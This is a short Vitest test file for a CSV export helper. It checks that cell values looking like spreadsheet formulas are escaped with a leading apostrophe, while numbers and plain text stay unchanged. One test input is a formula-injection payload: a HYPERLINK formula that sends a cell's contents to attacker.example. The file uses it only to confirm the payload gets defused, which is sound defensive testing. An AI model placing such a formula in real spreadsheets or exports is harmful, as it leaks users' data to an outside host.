import { describe, expect, it } from "vitest";
import { csvCell, toCsv } from "./csv";

describe("comparison CSV", () => {
  it("keeps extracted text that looks like a formula as text", () => {
    expect(csvCell("=2+5")).toBe("'=2+5");
    expect(csvCell("@SUM(1;2)")).toBe("'@SUM(1;2)");
    expect(csvCell("+44 20 7946 0000")).toBe("'+44 20 7946 0000");
    expect(csvCell('=HYPERLINK("https://attacker.example/?d="&B2,"Open")'))
      .toBe('"\'=HYPERLINK(""https://attacker.example/?d=""&B2,""Open"")"');
    expect(csvCell("\tlead")).toBe("'\tlead");
  });

  it("leaves numbers, numeric text and ordinary text unchanged", () => {
    expect(csvCell(-5)).toBe("-5");
    expect(csvCell("-5")).toBe("-5");
    expect(csvCell("0.75")).toBe("0.75");
    expect(csvCell(null)).toBe("");
    expect(csvCell("Simon Dow, Chair")).toBe('"Simon Dow, Chair"');
    expect(toCsv([["a", 1], ["=x", "b"]])).toBe("a,1\r\n'=x,b");
  });
});
